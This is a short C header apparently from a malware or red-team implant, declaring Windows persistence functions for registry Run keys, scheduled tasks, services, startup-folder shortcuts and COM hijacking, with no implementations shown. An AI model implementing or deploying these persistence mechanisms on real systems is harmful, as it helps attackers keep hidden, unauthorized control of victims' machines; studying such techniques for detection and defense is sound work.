#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>

int persist_reg_run(const char *name, const char *command);
int persist_reg_run_remove(const char *name);

int persist_schtask_create(const char *name, const char *command, const char *schedule);
int persist_schtask_remove(const char *name);

int persist_service_create(const char *name, const char *display, const char *bin_path);
int persist_service_remove(const char *name);

int persist_startup_lnk(const char *name, const char *target);
int persist_startup_remove(const char *name);

int persist_com_hijack(const char *clsid, const char *dll_path);

#endif
